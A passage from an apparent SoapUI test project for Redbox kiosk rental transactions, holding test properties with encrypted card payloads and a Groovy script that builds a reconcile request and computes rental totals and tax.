,986,400147,10578</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Movies,Movies,Movies,Games</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>DVD,DVD,Blu-ray,Xbox One</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>1.75,1.75,2.00,3.00</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>28.00,28.00,32.00,66.00</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>16,16,16,22</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>DiscountPayload</con:name><con:value/></con:property><con:property><con:name>CCPayload</con:name><con:value>"CreditCard": {"FirstName": "Redbox","LastName": "Server","Number": "kkTyOy89lJatgSC0KwYx0Foff1+aZewoaEULBunYKD9r7m57YY50NTgkAAXRvgWL7x1YRNV2fCwg9N74EZX4AzDuFdp85MM6+hAKJWkCDCGGiwQ0Id0v+0gDCL9NRouMno+8y7EBZ8AFTumRlYMl/cEYZUGqdAjRcNU1q5i2+qS9jDbOO99PwG6+p8+XWpbpv5j6IFpW3rrQKRP2DisTxezXno6pCt1paWTG2zdv8SfiOL8tHttxTo7q6epPEF6qnlu/G9gSUUods3p01x76AnCb1DPckstykFxFMD2tuWJrdm2tpE1CXOTTuKzdONJn94gGdcoY6u5n4UsmLPPsHfO4RJ19ZB+l8BgqnCODKXuC+6OiN/uSiKxdESZWYkqCmom4L1ZzARlaumVKSXLpkQmxBi8vGcAtn0v3Nd/pIQ5kHTAnbEShGouz/FiWFt3uejB0gMeCQN17nV9fE8WFLqkjwQxRoL2+c7EuXhzsUxP52ZT13KTwgSDeL7VyoGieCgIyWHd0S2RLToiyPyWk4F+ByGXH1g+1y13wRNm5olRIJW4MkZZ1RTY6n9InCTz0gYF6zAVO/g25gslYk2rdYK2pKeDPrLNToI9/+8H76yqD2tqSTviCrf6FaOazYCGQkOuD+nxidtZCdiamGqONb0GEH+u/5pubEIWH3pnIuZc=","PostalCode": "60181","ExpirationMonth": "12","ExpirationYear": "20","KeyId": 100002,"CardId": "sPGLKvq8XSHpLaJoXq6C03yZewBi8HYY4QZZP+ownFc=","LastFour": "1217","CardType": 4,"Track2": "IMehDga7BFnLDGDaDvq0qoQDbQ1iEoTTEWukW413fsUKdprLOvxYQDjgW6H071r6EzLygTdKCdZsxRcQpKTp2+1k4H3sd65Rscwi994CvloLhhgXMfAy4ey7UmaVFGNaJpgL2SBbKXJzjk1ybqXdQrVE6qzZx0Q4+AjeYTjv2dAlqTEQ7I599VnKiZGZ55Bz7VyDz3yzEKnS+HyCh04OWYKYyXzYVYXP6OgJdt8FSfhtBTqUMq2BBX5QK6kCuJxtu8YGhw1/m4jqsiDTJV/e2U7/CxhQywgyby88h1pUGDlaWEmgtwYk7k5AzVNxKaE984f8XEbPg/hQpeH0ROAUO2gS9mg4qZ3LEVwerwMdxu4vlevxClI7nRRHuGapsuHD8jdWPpdXX5UcLAm7J8ldSZ0zux4DElLkzV2NIP6phw/V1qkbQ+FWwlOq1nYJrt2yzpyw0Q+DNuZSOOUJuxzNjpXV37xHVZPqwbcInKb9yw9LPxTWSjM7V2FwPwMWWgnHr5SOpRtgXf+2MUFFM7/MmA2KCp2Wx5rO+7aeeYaWylAssIOHAnzBzkufbZ41MwMVgH5tG6pVJmGJIZZmypRCGMbkoN8Whti+BYJMPjuhNIKmnPyXNqs1Qa4iPBaWtPPY8g1q2oPlftSvyHqaI8YbHHBqIOWyDZ8e02rhgppIVF4="},</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value/></con:property><con:property><con:name>PromoValue</con:name><con:value>0</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>53910701710929</con:value></con:property><con:property><con:name>EstimatedLoyaltyAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>EnableServiceFee</con:name><con:value>false</con:value></con:property><con:property><con:name>ServiceFeePayload</con:name><con:value/></con:property><con:property><con:name>TransactionID</con:name><con:value>1983233</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058317</con:value></con:property><con:property><con:name>CardType</con:name><con:value>4</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : 1,  "Items" : [{"ProductId" : 1494,"Barcode" : "000150505","VendStatus" : 28,"ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"Pricing" : {"InitialNight" : 1.75,"ExtraNight" : 1.75,"NonReturn" : 28.00,"Expiration" : 1.75,"NonReturnDays" : 16,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 1.75,"DefaultExtraNight" : 1.75},"BlurayUpsell" : null,"SourceType" : 1},{"ProductId" : 986,"Barcode" : "000150501","VendStatus" : 0,"ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"DiscNumber" : null,"Pricing" : {"InitialNight" : 1.75,"ExtraNight" : 1.75,"NonReturn" : 28.00,"Expiration" : 1.75,"NonReturnDays" : 16,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 1.75,"DefaultExtraNight" : 1.75},"BlurayUpsell" : null,"SourceType" : 0},{"ProductId" : 400147,"Barcode" : "000027376","VendStatus" : 0,"ProductFamily" : "Movies","ProductType" : "Blu-ray","MultiDisc" : false,"DiscNumber" : null,"Pricing" : {"InitialNight" : 2.00,"ExtraNight" : 2.00,"NonReturn" : 32.00,"Expiration" : 2.00,"NonReturnDays" : 16,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 2.00,"DefaultExtraNight" : 2.00},"BlurayUpsell" : null,"SourceType" : 0},{"ProductId" : 10578,"Barcode" : "001505072","VendStatus" : 0,"ProductFamily" : "Games","ProductType" : "Xbox One","MultiDisc" : true,"DiscNumber" : null,"Pricing" : {"InitialNight" : 3.00,"ExtraNight" : 3.00,"NonReturn" : 66.00,"Expiration" : 3.00,"NonReturnDays" : 22,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 3.00,"DefaultExtraNight" : 3.00},"BlurayUpsell" : null,"SourceType" : 0}], "Totals" : { "TaxRate" : 9.7500, "Subtotal" : 8.5, "DiscountedSubtotal" : 8.5, "TaxAmount" : "0.82875", "GrandTotal" : 9.32875 } }</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>9.33</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22ResvAuth%22%2C%22MessageId%22%3A+%2247051cb3-8691-4d83-ae74-7b58fa2b24ae%22%2C%22EngineVersion%22%3A+%221.27.1.297%22%2C%22BundleVersion%22%3A+%222.27.1.65%22%2C%22KioskId%22%3A+1505%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22kkTyOy89lJatgSC0KwYx0Foff1%2BaZewoaEULBunYKD9r7m57YY50NTgkAAXRvgWL7x1YRNV2fCwg9N74EZX4AzDuFdp85MM6%2BhAKJWkCDCGGiwQ0Id0v%2B0gDCL9NRouMno%2B8y7EBZ8AFTumRlYMl%2FcEYZUGqdAjRcNU1q5i2%2BqS9jDbOO99PwG6%2Bp8%2BXWpbpv5j6IFpW3rrQKRP2DisTxezXno6pCt1paWTG2zdv8SfiOL8tHttxTo7q6epPEF6qnlu%2FG9gSUUods3p01x76AnCb1DPckstykFxFMD2tuWJrdm2tpE1CXOTTuKzdONJn94gGdcoY6u5n4UsmLPPsHfO4RJ19ZB%2Bl8BgqnCODKXuC%2B6OiN%2FuSiKxdESZWYkqCmom4L1ZzARlaumVKSXLpkQmxBi8vGcAtn0v3Nd%2FpIQ5kHTAnbEShGouz%2FFiWFt3uejB0gMeCQN17nV9fE8WFLqkjwQxRoL2%2Bc7EuXhzsUxP52ZT13KTwgSDeL7VyoGieCgIyWHd0S2RLToiyPyWk4F%2BByGXH1g%2B1y13wRNm5olRIJW4MkZZ1RTY6n9InCTz0gYF6zAVO%2Fg25gslYk2rdYK2pKeDPrLNToI9%2F%2B8H76yqD2tqSTviCrf6FaOazYCGQkOuD%2BnxidtZCdiamGqONb0GEH%2Bu%2F5pubEIWH3pnIuZc%3D%22%2C%22PostalCode%22%3A+%2260181%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%22sPGLKvq8XSHpLaJoXq6C03yZewBi8HYY4QZZP%2BownFc%3D%22%2C%22LastFour%22%3A+%221217%22%2C%22CardType%22%3A+4%2C%22Track2%22%3A+%22IMehDga7BFnLDGDaDvq0qoQDbQ1iEoTTEWukW413fsUKdprLOvxYQDjgW6H071r6EzLygTdKCdZsxRcQpKTp2%2B1k4H3sd65Rscwi994CvloLhhgXMfAy4ey7UmaVFGNaJpgL2SBbKXJzjk1ybqXdQrVE6qzZx0Q4%2BAjeYTjv2dAlqTEQ7I599VnKiZGZ55Bz7VyDz3yzEKnS%2BHyCh04OWYKYyXzYVYXP6OgJdt8FSfhtBTqUMq2BBX5QK6kCuJxtu8YGhw1%2Fm4jqsiDTJV%2Fe2U7%2FCxhQywgyby88h1pUGDlaWEmgtwYk7k5AzVNxKaE984f8XEbPg%2FhQpeH0ROAUO2gS9mg4qZ3LEVwerwMdxu4vlevxClI7nRRHuGapsuHD8jdWPpdXX5UcLAm7J8ldSZ0zux4DElLkzV2NIP6phw%2FV1qkbQ%2BFWwlOq1nYJrt2yzpyw0Q%2BDNuZSOOUJuxzNjpXV37xHVZPqwbcInKb9yw9LPxTWSjM7V2FwPwMWWgnHr5SOpRtgXf%2B2MUFFM7%2FMmA2KCp2Wx5rO%2B7aeeYaWylAssIOHAnzBzkufbZ41MwMVgH5tG6pVJmGJIZZmypRCGMbkoN8Whti%2BBYJMPjuhNIKmnPyXNqs1Qa4iPBaWtPPY8g1q2oPlftSvyHqaI8YbHHBqIOWyDZ8e02rhgppIVF4%3D%22%7D%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636814540215990000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222018-12-26T14%3A47%3A01.0000599%22%7D%2C%22UseCredits%22%3A+%220%22%2C%22ReferenceNumber%22%3A+5648740%2C%22CustomerProfileNumber%22%3A+%2253910701710929%22%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+1%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+1494%2C%22Barcode%22+%3A+%22000150505%22%2C%22VendStatus%22+%3A+28%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.75%2C%22ExtraNight%22+%3A+1.75%2C%22NonReturn%22+%3A+28.00%2C%22Expiration%22+%3A+1.75%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+1.75%2C%22DefaultExtraNight%22+%3A+1.75%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+1%7D%2C%7B%22ProductId%22+%3A+986%2C%22Barcode%22+%3A+%22000150501%22%2C%22VendStatus%22+%3A+0%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22DiscNumber%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.75%2C%22ExtraNight%22+%3A+1.75%2C%22NonReturn%22+%3A+28.00%2C%22Expiration%22+%3A+1.75%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+1.75%2C%22DefaultExtraNight%22+%3A+1.75%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%2C%7B%22ProductId%22+%3A+400147%2C%22Barcode%22+%3A+%22000027376%22%2C%22VendStatus%22+%3A+0%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22Blu-ray%22%2C%22MultiDisc%22+%3A+false%2C%22DiscNumber%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+2.00%2C%22ExtraNight%22+%3A+2.00%2C%22NonReturn%22+%3A+32.00%2C%22Expiration%22+%3A+2.00%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+2.00%2C%22DefaultExtraNight%22+%3A+2.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%2C%7B%22ProductId%22+%3A+10578%2C%22Barcode%22+%3A+%22001505072%22%2C%22VendStatus%22+%3A+0%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22Xbox+One%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+3.00%2C%22DefaultExtraNight%22+%3A+3.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22SourceType%22+%3A+0%7D%5D%2C+%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.7500%2C+%22Subtotal%22+%3A+8.5%2C+%22DiscountedSubtotal%22+%3A+8.5%2C+%22TaxAmount%22+%3A+%220.82875%22%2C+%22GrandTotal%22+%3A+9.32875+%7D+%7D%5D%2C%22Discounts%22%3A+%5B%5D%7D%7D+</con:value></con:property><con:property><con:name>ItemSourceType</con:name><con:value>1,0,0,0</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value/></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value/></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value/></con:property><con:property><con:name>justBuildRequest</con:name><con:value>true</con:value></con:property><con:property><con:name>RentalMDVFlag</con:name><con:value>false,false,false,true</con:value></con:property><con:property><con:name>RentalMDVDiscNumber</con:name><con:value>null,null,null,null</con:value></con:property><con:property><con:name>PurchaseMDVFlag</con:name><con:value/></con:property><con:property><con:name>PurchaseMDVDiscNumber</con:name><con:value/></con:property><con:property><con:name>MDVFlag</con:name><con:value/></con:property><con:property><con:name>MDVDiscNumber</con:name><con:value/></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>86b29e8b-9449-4b42-a501-717ac5b2bccc</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>aee6dc73-e1a0-4123-aabd-fcd972f9608d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Reconcile" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="c842226c-710b-4962-ae27-9c6ebb5f34cb"><con:description/><con:settings/><con:testStep type="groovy" name="Encode Message Body (Reconcile)" id="e159f83a-da3c-4a13-b9b9-242c3fec26c6"><con:settings/><con:config><script><![CDATA[//NOTES: Starting from just for Rental, need to add logic for purchase.
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
testRunner.testCase.setPropertyValue("CardType",CardType);
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def uhdPrice = context.expand( '${#TestSuite#4KPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def uhdNonReturnDays = context.expand( '${#TestSuite#4KNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' );

//Reconcile
vendedRentalBarcodes = [];
vendedPurchaseBarcodes = [];
int VendedRentalsCount = 0;
int VendedPurchaseCount = 0;
nonvendedRentalBarcodes = [];
nonvendedPurchaseBarcodes = [];

rentalPayload = "{\"GroupType\" : 1,  \"Items\" : [";
BigDecimal rentalTotal = 0;
purchasePayload = "{\"GroupType\" :2,  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
rentalTitleIds = []; //will have both rental and purchase titleIds.
requestPayload = "";
BigDecimal discountAmountValue = 0; //PROMO

def numAddRentals = context.expand( '${#TestCase#numOfRentals}' );
numAddRentalsList = numAddRentals.split(",");
def numAddPurchases = context.expand( '${#TestCase#numOfPurchases}' );
numAddPurchasesList = numAddPurchases.split(",");
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );

//Total rental and purchase count
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();;
log.info ("purchaseCount:$purchaseCount; rentalCount:$rentalCount")
EstimatedLoyaltyAmount = context.expand( '${#TestCase#EstimatedLoyaltyAmount}' )
if(rentalCount > 0)
{
	BigDecimal EstimatedLoyaltyAmount = EstimatedLoyaltyAmount.toBigDecimal();
}
else
{
	BigDecimal EstimatedLoyaltyAmount = 0;
}
//PROMO
//For Promo Amount Calculations
discountAmounts = Eval.me("[" + context.expand( '${#TestCase#DiscountAmountList}' ) + "]");
if (rentalCount != discountAmounts.size())
{
	def difference = (rentalCount - discountAmounts.size())
     for (i = 0; i < difference; i++)
     {
     	discountAmounts.add('0') //if the size is different add the default to 0
     }
}

//Discount and CreditCard payload
def discountPayload = context.expand( '${#TestCase#DiscountPayload}' );
def serviceFeePayload = context.expand( '${#TestCase#ServiceFeePayload}' );
def ccPayload = context.expand( '${#TestCase#CCPayload}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );

//Rentala and Purchase disc info from Authorize
def purchaseBarcodes = context.expand( '${#TestCase#PurchaseBarcodes}' );
def purchaseTitleIds = context.expand( '${#TestCase#PurchaseTitleIds}' );
def purchaseProductFamily = context.expand( '${#TestCase#PurchaseProductFamily}' );
def purchaseProductType = context.expand( '${#TestCase#PurchaseProductType}' );
def purchaseDiscPrice = context.expand( '${#TestCase#PurchaseDiscPrice}' );
def purchaseVendStatus = context.expand( '${#TestCase#PurchaseVendStatus}' );

def rentalBarcodes = context.expand( '${#TestCase#RentalBarcodes}' );
def rentalTitleIds = context.expand( '${#TestCase#RentalTitleIds}' );
def rentalProductFamily = context.expand( '${#TestCase#RentalProductFamily}' );
def rentalProductType = context.expand( '${#TestCase#RentalProductType}' );
def rentalDiscPrice = context.expand( '${#TestCase#RentalDiscPrice}' );
def rentalNonReturnPrice = context.expand( '${#TestCase#RentalNonReturnPrice}' );
def rentalNonReturnDays = context.expand( '${#TestCase#RentalNonReturnDays}' );
def rentalVendStatus = context.expand( '${#TestCase#RentalVendStatus}' ); 
def upsellOffer = context.expand( '${#TestCase#UpsellOffer}' );
def upsellOfferStatus = context.expand( '${#TestCase#UpsellOfferStatus}' );
def upsellTypeId = context.expand( '${#TestCase#UpsellTypeId}' ); 
def productGroupId = context.expand( '${#TestCase#ProductGroupId}' ); 
def HasUpsell = context.expand( '${#TestCase#HasUpsell}' ); 

//MDV
def rentalMDVFlag = context.expand( '${#TestCase#RentalMDVFlag}' )
def rentalMDVDiscNumber = context.expand( '${#TestCase#RentalMDVDiscNumber}' )
def purchaseMDVFlag = context.expand( '${#TestCase#PurchaseMDVFlag}' )
def purchaseMDVDiscNumber = context.expand( '${#TestCase#PurchaseMDVDiscNumber}' )

purchaseBarcodesList = purchaseBarcodes.split(",");
purchaseTitleIdsList = purchaseTitleIds.split(",");
purchaseProductFamilyList = purchaseProductFamily.split(",");
purchaseProductTypeList = purchaseProductType.split(",");
purchaseDiscPriceList = purchaseDiscPrice.split(",");
purchaseVendStatusList = purchaseVendStatus.split(","); //TO-DO
rentalBarcodesList = rentalBarcodes.split(",");
rentalTitleIdsList = rentalTitleIds.split(",");
rentalProductFamilyList = rentalProductFamily.split(",");
rentalProductTypeList = rentalProductType.split(",");
rentalDiscPriceList = rentalDiscPrice.split(",");
rentalNonReturnPriceList = rentalNonReturnPrice.split(",");
rentalNonReturnDaysList = rentalNonReturnDays.split(",");
rentalVendStatusList = rentalVendStatus.split(","); //TO-DO
upsellOfferList = upsellOffer.split(",");
upsellOfferStatusList = upsellOfferStatus.split(",");
upsellTypeIdList = upsellTypeId.split(","); 
productGroupIdList = productGroupId.split(","); 
discountAmountList = discountAmounts.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");//PROMO

//MDV
rentalMDVFlagList = rentalMDVFlag.split(",");
rentalMDVDiscNumberList = rentalMDVDiscNumber.split(",");
purchaseMDVFlagList = purchaseMDVFlag.split(",");
purchaseMDVDiscNumberList = purchaseMDVDiscNumber.split(",");

//Recommended Titles
def RCFlag = context.expand( '${#TestCase#RCFlag}' );
def rentalRCFlag = context.expand( '${#TestCase#rentalRCFlag}' );
def purchaseRCFlag = context.expand( '${#TestCase#purchaseRCFlag}' );
offerCodeList = RCFlag.split(",");
rentalofferCodeList = rentalRCFlag.split(",");
purchaseofferCodeList = purchaseRCFlag.split(",");

//Build Rental Payload
if (rentalCount <= 0)
{
	log.info ("No Rentals in the transaction");
	testRunner.testCase.setPropertyValue('VendedRentalsCount', VendedRentalsCount.toString());
}
else
{
	for (r = 0; r < rentalBarcodesList.size(); r++)
	{				
		curOfferCode = rentalofferCodeList[r].toString().trim();
		currentalBarcodeId = rentalBarcodesList[r].toString().trim();
		currentalTitleId = rentalTitleIdsList[r].toString().trim();
		currentalProductFamily = rentalProductFamilyList[r].toString().trim();
		currentalProductType = rentalProductTypeList[r].toString().trim();
		currentalDiscPrice = rentalDiscPriceList[r].toString().trim();
		currentalNonReturnPrice = rentalNonReturnPriceList[r].toString().trim();
		currentalNonReturnDays = rentalNonReturnDaysList[r].toString().trim();
		currentalVendStatus = rentalVendStatusList[r].toString().trim();
		curdiscountAmount = discountAmountList[r].toString().trim();
		
		//MDV
		curRentalMDVFlag = rentalMDVFlagList[r].toString().trim();
		curRentalMDVDiscNumber = rentalMDVDiscNumberList[r].toString().trim();
		
		if (HasUpsell == 'true')
		{
			curupsellOffer = upsellOfferList[r].toString().trim();
			curupsellOfferStatus = upsellOfferStatusList[r].toString().trim();
			curupsellTypeId = upsellTypeIdList[r].toString().trim();
			curproductGroupId = productGroupIdList[r].toString().trim();
		}
		else
		{
			curupsellOffer = '0'
		}
		
		rentalPayload += "{"
		rentalPayload += "\"ProductId\" : $currentalTitleId,"
		rentalPayload += "\"Barcode\" : \"$currentalBarcodeId\","
		rentalPayload += "\"VendStatus\" : \"$currentalVendStatus\"," //To-DO
		rentalPayload += "\"ProductFamily\" : \"$currentalProductFamily\","
		rentalPayload += "\"ProductType\" : \"$currentalProductType\","
		rentalPayload += "\"MultiDisc\" : $curRentalMDVFlag,"
		rentalPayload += "\"DiscNumber\" : $curRentalMDVDiscNumber,"
		if (curOfferCode == '1')
		{
			rentalPayload += "\"OfferCode\" : \"RC\","
		}
		else
		{
			rentalPayload += "\"OfferCode\" : null,"
		}
		rentalPayload += "\"Pricing\" : {"
		rentalPayload += "\"InitialNight\" : $currentalDiscPrice,"
		rentalPayload += "\"ExtraNight\" : $currentalDiscPrice,"
		rentalPayload += "\"NonReturn\" : $currentalNonReturnPrice,"
		rentalPayload += "\"Expiration\" : $currentalDiscPrice,"
		rentalPayload += "\"NonReturnDays\" : $currentalNonReturnDays,"
		rentalPayload += "\"PriceSetId\" : 0,"
		rentalPayload += "\"Purchase\" : 0,"
		//Added a part of ProductPricing for BI; harcoded for the time being.
		rentalPayload += "\"ProductPriceId\" : 0,"
		rentalPayload += "\"InitialDays\" : 1,"
		rentalPayload += "\"DefaultInitialNight\" : $currentalDiscPrice,"
		rentalPayload += "\"DefaultExtraNight\" : $currentalDiscPrice"
		rentalPayload += "}," 
		if (curupsellOffer == '1')
		{
			rentalPayload += "\"BlurayUpsell\" : {"
			rentalPayload += "\"ProductGroupId\" : $curproductGroupId,"
			rentalPayload += "\"Offer\" : \"$curupsellOfferStatus\","
			rentalPayload += "\"TitleId\" : $currentalTitleId,"
			rentalPayload += "\"TypeId\" : $curupsellTypeId"
			rentalPayload += "},"
		}
		else
		{
			rentalPayload += "\"BlurayUpsell\" : null,"
		}
		
		rentalPayload += "\"ItemSourceType\" : 3"
		rentalPayload += "}" 


		if (r+1 < rentalBarcodesList.size())
		{
		   rentalPayload += ","
		} 

		//Capture vended rentals count and non-vended dics.
		if (currentalVendStatus.equals("Vended")) 
		{
			//Capture Amount of the Disc
			rentalTotal += (currentalDiscPrice.toBigDecimal());
			discountAmountValue += (curdiscountAmount.toBigDecimal()); //PROMO
			discountAmounts
			//Capture Vended Rental
			vendedRentalBarcodes.add(currentalBarcodeId);
			VendedRentalsCount += 1 ;
			testRunner.testCase.setPropertyValue("BarcodeForTnx", currentalBarcodeId);
		} 
		else 
		{
			//Capture Non-vended Rentals
			nonvendedRentalBarcodes.add(currentalBarcodeId);
			testRunner.testCase.setPropertyValue("NonVendedBarcodeForTnx", currentalBarcodeId);
		}
	}
	testRunner.testCase.setPropertyValue('VendedRentalBarcodes', vendedRentalBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('NonVendedRentalBarcodes', nonvendedRentalBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('VendedRentalsCount', VendedRentalsCount.toString());
	
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal

	//PROMO
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountAmountValue).toBigDecimal())
	/*
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((EstimatedLoyaltyAmount).toBigDecimal())
	
	if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	else { discountedSubTotal = ((discountedSubTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	if (discountedSubTotal < 0)
	{
		discountedSubTotal = 0
	}
	*/
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
